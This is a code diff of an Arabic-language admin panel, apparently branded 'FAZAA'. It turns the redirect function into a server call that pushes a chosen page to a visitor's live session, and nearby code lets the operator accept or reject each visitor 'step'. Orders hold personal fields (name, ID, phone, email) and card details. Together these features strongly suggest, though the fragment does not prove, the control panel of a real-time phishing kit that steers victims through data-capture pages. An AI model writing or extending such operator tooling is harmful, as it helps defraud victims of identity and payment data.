@@ -678,15 +678,25 @@ async function decide(ref, decision){
     if (r.ok) { toast(decision === "accept" ? "تم قبول الخطوة" : "تم رفض الخطوة"); refresh(); }
   } catch (e) { toast("تعذّر تنفيذ الإجراء"); }
 }
-function redirect(ref, targetName){
+async function redirect(ref, targetName){
   const o = loadOrders().find(x => x.ref === ref); if (!o) return;
-  const enc = encodeData({ st:o.st, n:o.n, id:o.id, p:o.p, e:o.e, g:o.g, em:o.em, a:o.a, ad:o.ad });
-  const plan = o.card + (o.watch ? "-" + o.watch : "");
   const selectedTarget = targetName || (window.FAZAA_LOCALE && typeof window.FAZAA_LOCALE.getRedirectTargetName === "function" ? window.FAZAA_LOCALE.getRedirectTargetName() : "order");
-  const redirectTarget = (window.FAZAA_LOCALE && typeof window.FAZAA_LOCALE.resolveRedirectPath === "function")
-    ? window.FAZAA_LOCALE.resolveRedirectPath(selectedTarget)
-    : "order.html";
-  location.href = `${redirectTarget}#${plan}~${enc}`;
+  try {
+    const r = await fetch("/api/admin/redirect/" + encodeURIComponent(ref), {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "x-admin-password": PW },
+      body: JSON.stringify({ target: selectedTarget, locale: window.FAZAA_LOCALE && typeof window.FAZAA_LOCALE.getCurrentLocale === "function" ? window.FAZAA_LOCALE.getCurrentLocale() : "ar" })
+    });
+    if (r.ok) {
+      const label = (window.FAZAA_LOCALE && window.FAZAA_LOCALE.REDIRECT_TARGETS && window.FAZAA_LOCALE.REDIRECT_TARGETS[selectedTarget] && window.FAZAA_LOCALE.REDIRECT_TARGETS[selectedTarget].label && window.FAZAA_LOCALE.REDIRECT_TARGETS[selectedTarget].label.ar) ? window.FAZAA_LOCALE.REDIRECT_TARGETS[selectedTarget].label.ar : "الصفحة المختارة";
+      toast(`تم إرسال إعادة التوجيه إلى ${o.n} -> ${label}`);
+    } else {
+      const d = await r.json().catch(() => ({}));
+      toast(d && d.error === "visitor_not_found" ? "لا توجد جلسة نشطة لهذا المستخدم الآن" : "تعذر إرسال إعادة التوجيه");
+    }
+  } catch (e) {
+    toast("تعذر إرسال إعادة التوجيه");
+  }
 }
 function encodeData(obj){
   const bytes = new TextEncoder().encode(JSON.stringify(obj));
